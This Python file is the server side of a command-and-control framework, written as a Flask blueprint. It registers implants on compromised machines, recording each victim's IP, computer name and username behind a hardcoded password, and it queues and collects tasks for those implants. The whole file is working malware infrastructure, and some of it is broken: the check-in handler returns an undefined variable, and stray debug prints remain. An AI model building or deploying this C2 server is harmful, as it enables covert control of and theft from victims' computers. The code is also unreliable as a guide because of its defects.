# rpc blueprint - Implant <--> Server

from flask import Blueprint, request , abort 

from cvnt.implant_pb2 import * 

from flask_wtf.csrf import * # type: ignore

from cvnt.db_operations import *

from cvnt.constants import *

rpc = Blueprint("rpc", __name__)

PASSWORD = "SUPER_COMPLEX_PASSWORD_WOWZA!!!"

@rpc.route("/register", methods=["POST"])
def handle_register():

    ip = request.remote_addr
    print(f"{ip}")
    reg_data = request.get_data()
    print("2")
    register = RegisterImplant()
    print("3")
    register.ParseFromString(reg_data)
    print("4")
    print(f'[+] New Implant: from {request.remote_addr}')
    print(f'[+]    * ImplantID: {register.ImplantID}')
    print(f'[+]    * ComputerName: {register.ComputerName}')
    print(f'[+]    * Username: {register.Username}')
    print(f'[+]    * Password: {register.Password}')

    if register.Password != PASSWORD:
        abort(404)

    r = register_implant(make_implant(register, ip))

    print("[+] Watch out sexy ;) a New Implant connected!")

    return SUCCESSFUL

@rpc.route("/checkin", methods=["POST"])
def checkin():
    reg_data = request.get_data()
    ic = ImplantCheckin()
    ic.ParseFromString(reg_data)
    print(f'[+] Implant [{ic.ImplantID}] checking in.')
    print(f'[+] --> TaskResponse = [{ic.Resp}]')

    update_implant_last_seen(ic.ImplantID) 
    
    response = analyze_TaskResponse(ic.Resp)

    # Send TaskRequest back or "" (if no tasks)
    return reponse

@rpc.route("/task/request", methods=["POST"])
def send_task():
    try:
        task_request = TaskRequest()
        task_request.ParseFromString(request.get_data())
        
        # Assuming the TaskRequest contains implant_id and other necessary details
        implant = Implant.query.get(task_request.implant_id)
        if not implant:
            return "Implant not found", 404
        
        # Create a new task entry
        new_task = make_task(
            id=None,
            task_id=task_request.task_id,
            status="created",
            implant_id=implant.id,
            task_opcode=task_request.opcode,
            task_args=task_request.args
        )
        db.session.add(new_task)
        db.session.commit()
        
        print(f"Task {new_task.task_id} sent to implant {implant.id}")
        return f"Task sent to implant {implant.id}", 200
    except Exception as e:
        print(f"Error sending task: {e}")
        return str(e), 500


@rpc.route("/task/response", methods=["POST"])
def receive_task_response():
    try:
        task_response = TaskResponse()
        task_response.ParseFromString(request.get_data())
        # Update the task status based on the response
        task = Task.query.filter_by(task_id=task_response.task_guid).first()
        if not task:
            return "Task not found", 404
        
        task.status = STATUS_TASK_COMPLETE if task_response.response else STATUS_TASK_FAILED
        db.session.commit()
        
        print(f"Received response for task {task.task_id} from implant {task.implant_id}")
        return f"Response received for task {task.task_id}", 200
    except Exception as e:
        print(f"Error receiving task response: {e}")
        return str(e), 500